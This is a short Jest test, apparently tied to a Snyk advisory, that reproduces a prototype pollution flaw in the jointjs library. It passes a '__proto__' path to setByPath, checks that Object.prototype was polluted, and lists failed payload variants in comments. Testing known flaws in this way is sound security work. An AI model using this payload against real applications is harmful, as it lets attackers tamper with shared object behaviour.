//https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578
test("prototype pollution in jointjs", () => {
  expect({}.polluted).toBe(undefined);

  const jointjs = require("jointjs");
  jointjs.util.setByPath({}, [["__proto__"], "polluted"], "yes");

  expect({}.polluted).toBe("yes");
});

// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
